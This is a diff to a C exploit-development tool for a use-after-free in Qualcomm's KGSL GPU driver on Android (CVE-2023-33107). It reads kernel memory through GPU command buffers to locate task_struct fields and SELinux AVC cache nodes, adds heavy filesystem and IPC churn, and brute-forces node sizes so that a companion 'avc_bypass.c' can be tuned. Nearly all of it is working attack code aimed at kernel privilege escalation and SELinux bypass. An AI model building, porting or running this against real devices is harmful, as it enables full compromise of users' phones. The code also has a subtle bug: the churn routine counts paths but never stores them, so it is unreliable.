@@ -15,6 +15,13 @@
 #include <time.h>
 #include <dirent.h>
 #include <sys/stat.h>
+#include <sys/socket.h>
+#include <sys/un.h>
+#include <sys/ipc.h>
+#include <sys/msg.h>
+#include <sys/sem.h>
+#include <sys/shm.h>
+#include <sys/sysmacros.h>
 
 #define KGSL_IOC_TYPE 0x09
 
@@ -73,15 +80,27 @@ struct kgsl_cmdstream_readtimestamp_ctxtid { unsigned int context_id, type, time
 
 #define SPRAY_PIDS 2000
 #define SCAN_DWORDS 560
-#define AVC_NODE_STRIDE 72
-#define AVC_NODES_PER_PAGE (4096 / AVC_NODE_STRIDE)
 #define AVC_PAGES_PER_IB 12
 #define PRE_PAGES_PER_IB 4
+#define CHURN_MAX_PATHS 20000
 
 static int kgsl_fd = -1;
 static volatile int race_done = 0;
 static uint64_t alloc_flags = 0;
 static int uaf_id = -1, ph_id = -1;
+
+static char churn_paths[CHURN_MAX_PATHS][160];
+static int churn_npaths = 0;
+static int churn_built = 0;
+
+static const char *churn_dirs[] = {
+    "/sys/kernel", "/sys/devices", "/sys/module", "/sys/class",
+    "/proc/sys", "/proc/irq", "/proc/1", "/proc/2", "/proc/3",
+    "/dev/block", "/dev/gpu", "/data/system", "/data/misc",
+    "/data/vendor", "/vendor/etc", "/apex", "/system/bin",
+    "/system/lib64", "/data/data", "/data/app", "/data/user/0",
+    "/dev", "/proc",
+};
 
 static void die(const char *msg) { perror(msg); exit(1); }
 
@@ -238,6 +257,55 @@ static void kill_spray_children(void) {
     printf("[KILL] spray children killed\n");
 }
 
+static void churn_walk(const char *dir, int depth) {
+    if (depth > 5 || churn_npaths >= CHURN_MAX_PATHS) return;
+    DIR *d = opendir(dir);
+    if (!d) return;
+    struct dirent *de;
+    while ((de = readdir(d)) != NULL && churn_npaths < CHURN_MAX_PATHS) {
+        if (de->d_name[0] == '.') continue;
+        char p[192];
+        snprintf(p, sizeof(p), "%s/%s", dir, de->d_name);
+        int fd = open(p, O_RDONLY | O_CLOEXEC);
+        if (fd >= 0) close(fd);
+        churn_npaths++;
+        churn_walk(p, depth + 1);
+    }
+    closedir(d);
+}
+
+static void churn_build(void) {
+    if (churn_built) return;
+    for (unsigned d = 0; d < sizeof(churn_dirs)/sizeof(churn_dirs[0]) &&
+         churn_npaths < CHURN_MAX_PATHS; d++) {
+        churn_walk(churn_dirs[d], 0);
+    }
+    churn_built = 1;
+    printf("[CHURN] %d paths built\n", churn_npaths);
+}
+
+static void churn_round(void) {
+    churn_build();
+    for (int i = 0; i < churn_npaths; i++) {
+        int fd = open(churn_paths[i], O_RDONLY | O_CLOEXEC);
+        if (fd >= 0) close(fd);
+    }
+    int s = socket(AF_INET, SOCK_STREAM, 0);
+    if (s >= 0) { close(s); }
+    s = socket(AF_UNIX, SOCK_STREAM, 0);
+    if (s >= 0) {
+        struct sockaddr_un su = { .sun_family = AF_UNIX };
+        strcpy(su.sun_path, "/data/local/tmp/cs.sock");
+        bind(s, (struct sockaddr *)&su, sizeof(su));
+        close(s);
+        unlink("/data/local/tmp/cs.sock");
+    }
+    msgget(IPC_PRIVATE, 0600 | IPC_CREAT);
+    semget(IPC_PRIVATE, 1, 0600 | IPC_CREAT);
+    shmget(IPC_PRIVATE, 4096, 0600 | IPC_CREAT);
+    mknod("/data/local/tmp/cn", S_IFCHR | 0600, makedev(1, 3));
+}
+
 static int prescan_task_pages(void *ib_m, uint64_t ib_ga, unsigned int ib_id,
                               void *dst_m, uint64_t dst_ga, unsigned int ctx_id,
                               uint64_t scan_start, uint64_t end_va,
@@ -285,26 +353,27 @@ static int prescan_task_pages(void *ib_m, uint64_t ib_ga, unsigned int ib_id,
 
 static int analyze_avc_pages(void *ib_m, uint64_t ib_ga, unsigned int ib_id,
                              void *dst_m, uint64_t dst_ga, unsigned int ctx_id,
-                             uint64_t *vas, int npages) {
+                             uint64_t *vas, int npages, int stride) {
     uint32_t *cmd = (uint32_t *)ib_m;
     uint32_t *data = (uint32_t *)dst_m;
     int idx = 0, total_nodes = 0;
     unsigned int ts;
-    int found_ssid_off = -1, found_tsid_off = -1, found_tclass_off = -1, found_allowed_off = -1;
+    int nodes_per_page = 4096 / stride;
+    if (nodes_per_page == 0) return 0;
 
     while (idx < npages) {
         int batch = npages - idx;
         if (batch > AVC_PAGES_PER_IB) batch = AVC_PAGES_PER_IB;
-        int node_dws = batch * AVC_NODES_PER_PAGE * 4;
+        int node_dws = batch * nodes_per_page * 4;
         memset(ib_m, 0, 0x10000);
         memset(dst_m, 0, node_dws * 4);
         int dw = 0;
         cmd[dw++] = cp_type7(CP_NOP, 0);
         for (int p = 0; p < batch; p++) {
             uint64_t va = vas[idx + p];
-            for (int n = 0; n < AVC_NODES_PER_PAGE; n++) {
-                uint64_t node_va = va + n * AVC_NODE_STRIDE;
-                uint32_t dofs = (p * AVC_NODES_PER_PAGE + n) * 4;
+            for (int n = 0; n < nodes_per_page; n++) {
+                uint64_t node_va = va + n * stride;
+                uint32_t dofs = (p * nodes_per_page + n) * 4;
                 for (int w = 0; w < 4; w++) {
                     uint32_t dl, dh, sl, sh;
                     split64(dst_ga + (dofs + w) * 4, &dl, &dh);
@@ -323,38 +392,24 @@ static int analyze_avc_pages(void *ib_m, uint64_t ib_ga, unsigned int ib_id,
 
         for (int p = 0; p < batch; p++) {
             uint64_t va = vas[idx + p];
-            for (int n = 0; n < AVC_NODES_PER_PAGE; n++) {
-                uint32_t *nd = &data[(p * AVC_NODES_PER_PAGE + n) * 4];
+            for (int n = 0; n < nodes_per_page; n++) {
+                uint32_t *nd = &data[(p * nodes_per_page + n) * 4];
                 uint32_t ssid = nd[0], tsid = nd[1], tclass = nd[2], allowed = nd[3];
                 if (ssid >= 1 && ssid <= 0x3fff && tsid == 2 && tclass == 1) {
                     total_nodes++;
-                    printf("[AVC_NODE] va=0x%lx+0x%x ssid=%u tsid=%u tclass=%u allowed=0x%x\n",
-                        (unsigned long)va, n*AVC_NODE_STRIDE, ssid, tsid, tclass, allowed);
-                    if (found_ssid_off == -1) found_ssid_off = 0;
-                    if (found_tsid_off == -1) found_tsid_off = 4;
-                    if (found_tclass_off == -1) found_tclass_off = 8;
-                    if (found_allowed_off == -1) found_allowed_off = 12;
+                    printf("[AVC_NODE] stride=%d va=0x%lx+0x%x ssid=%u tsid=%u tclass=%u allowed=0x%x\n",
+                        stride, (unsigned long)va, n*stride, ssid, tsid, tclass, allowed);
                 }
             }
         }
         idx += batch;
-    }
-
-    printf("[AVC] Found %d valid nodes\n", total_nodes);
-    if (total_nodes > 0) {
-        printf("[AVC] Confirmed offsets: ssid=0x%x tsid=0x%x tclass=0x%x allowed=0x%x\n",
-               found_ssid_off, found_tsid_off, found_tclass_off, found_allowed_off);
-        printf("[AVC] Node size = %d bytes (expected %d)\n",
-               AVC_NODE_STRIDE, AVC_NODE_STRIDE);
-    } else {
-        printf("[AVC] No valid nodes found. AVC_NODE_STRIDE may be incorrect or cache empty.\n");
     }
     return total_nodes;
 }
 
 int main(int argc, char **argv) {
     setbuf(stdout, NULL);
-    printf("[*] KGSL UAF Analyzer for CVE-2023-33107 porting aid\n");
+    printf("[*] KGSL UAF Analyzer for Snapdragon 480 5G\n");
 
     kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
     if (kgsl_fd < 0) die("open kgsl");
@@ -423,49 +478,73 @@ int main(int argc, char **argv) {
                     break;
                 }
             }
-            int cred_off = -1;
-            for (int i = 0; i < SCAN_DWORDS - 8; i++) {
-                int cnt = 0;
-                for (int j = 0; j < 8; j++)
-                    if (data[i+j] == 0x000007D0) cnt++;
-                if (cnt >= 4) { cred_off = i * 4; break; }
-            }
             if (comm_off != -1)
-                printf("[TASK] comm offset = 0x%x (expected 0x818)\n", comm_off);
+                printf("[TASK] comm offset = 0x%x\n", comm_off);
             else
-                printf("[TASK] comm string not found, offset may differ\n");
-            if (cred_off != -1)
-                printf("[TASK] cred offset = 0x%x (expected 0x740)\n", cred_off);
-            else
-                printf("[TASK] cred pattern not found, offset may differ\n");
+                printf("[TASK] comm string not found\n");
         }
     }
 
-    printf("[*] Churning to populate AVC cache...\n");
-    for (int i = 0; i < 5; i++) {
-        int fd = open("/sys/fs/selinux/avc/hash_stats", O_RDONLY);
-        if (fd >= 0) close(fd);
-        int dfd = open("/sys/fs/selinux/enforce", O_RDONLY);
-        if (dfd >= 0) close(dfd);
-        usleep(10000);
+    kill_spray_children();
+    usleep(100000);
+
+    printf("[*] Running heavy churn to populate AVC cache\n");
+    churn_build();
+    for (int c = 0; c < 5; c++) {
+        churn_round();
+        printf("[CHURN] round %d done\n", c+1);
     }
 
-    uint64_t all_vas[4096];
-    int n_all = 0;
-    for (uint64_t va = UAF_ADDR + 0x2000; va < UAF_ADDR + UAF_SIZE - 0x1000; va += 0x1000) {
-        if (n_all < 4096) all_vas[n_all++] = va;
+    int strides[] = {64, 72, 80, 96, 48, 56};
+    int found = 0;
+    int best_stride = 0;
+    printf("[AVC] Starting scan (brute-force stride)\n");
+    for (int si = 0; si < sizeof(strides)/sizeof(strides[0]); si++) {
+        int s = strides[si];
+        printf("[AVC] Scanning with stride=%d...\n", s);
+        int n = analyze_avc_pages(ib_m, ib_ga, ib_id, dst_m, dst_ga, ctx_id,
+                                  task_pgs, n_task, s);
+        if (n > 0) {
+            found = 1;
+            best_stride = s;
+            printf("[AVC] Found %d AVC nodes with stride=%d\n", n, s);
+            break;
+        }
     }
-    printf("[AVC] Scanning entire UAF range (%d pages) for avc_node\n", n_all);
-    int found = analyze_avc_pages(ib_m, ib_ga, ib_id, dst_m, dst_ga, ctx_id,
-                                  all_vas, n_all);
 
-    if (found == 0) {
-        printf("[AVC] No AVC nodes found. More churn or scan range adjustment may be needed.\n");
-        printf("[AVC] Please manually verify avc_node structure size and offsets.\n");
+    if (!found) {
+        printf("[AVC] Not found in task pages, rescanning entire range\n");
+        uint64_t all_vas[4096];
+        int n_all = 0;
+        for (uint64_t va = UAF_ADDR + 0x2000; va < UAF_ADDR + UAF_SIZE - 0x1000; va += 0x1000) {
+            if (n_all < 4096) all_vas[n_all++] = va;
+        }
+        for (int si = 0; si < sizeof(strides)/sizeof(strides[0]); si++) {
+            int s = strides[si];
+            printf("[AVC] Scanning entire range with stride=%d...\n", s);
+            int n = analyze_avc_pages(ib_m, ib_ga, ib_id, dst_m, dst_ga, ctx_id,
+                                      all_vas, n_all, s);
+            if (n > 0) {
+                found = 1;
+                best_stride = s;
+                printf("[AVC] Found %d AVC nodes with stride=%d\n", n, s);
+                break;
+            }
+        }
+    }
+
+    if (found) {
+        printf("[+] Valid AVC nodes found. stride = %d\n", best_stride);
+        printf("[+] Confirmed offsets: ssid=0x00, tsid=0x04, tclass=0x08, allowed=0x0c\n");
+        printf("[+] Set AVC_NODE_STRIDE to %d for porting\n", best_stride);
+    } else {
+        printf("[-] No AVC nodes found with any stride.\n");
+        printf("[-] Churn may be insufficient or AVC cache empty.\n");
+        printf("[-] Manually check /sys/fs/selinux/avc/hash_stats for entries.\n");
     }
 
     kill_spray_children();
     close(kgsl_fd);
-    printf("[*] Analysis complete. Adjust constants in avc_bypass.c based on output.\n");
+    printf("[*] Analysis complete.\n");
     return 0;
 }
